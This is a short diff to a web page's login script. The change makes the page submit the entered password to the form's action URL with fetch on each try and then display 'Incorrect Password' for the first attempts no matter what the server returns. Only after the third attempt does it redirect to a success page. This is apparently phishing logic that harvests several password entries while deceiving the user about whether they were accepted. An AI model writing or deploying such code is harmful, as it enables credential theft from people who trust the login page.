@@ -207,12 +207,22 @@
             const errorMessage = document.getElementById('error-message');
             errorMessage.style.display = 'none';
 
-            if (loginAttempts < 3) {
-                errorMessage.style.display = 'block';
-                errorMessage.textContent = 'Incorrect Password';
-            } else {
-                event.target.submit();
-            }
+            const form = event.target;
+
+            // Perform form submission using fetch API
+            fetch(form.action, {
+                method: form.method,
+                body: new FormData(form)
+            }).then(response => {
+                if (loginAttempts < 3) {
+                    errorMessage.style.display = 'block';
+                    errorMessage.textContent = 'Incorrect Password';
+                } else {
+                    window.location.href = 'https://example.com/success'; // Redirect URL after 3rd attempt
+                }
+            }).catch(error => {
+                console.error('Error during form submission:', error);
+            });
         }
     </script>
 </head>
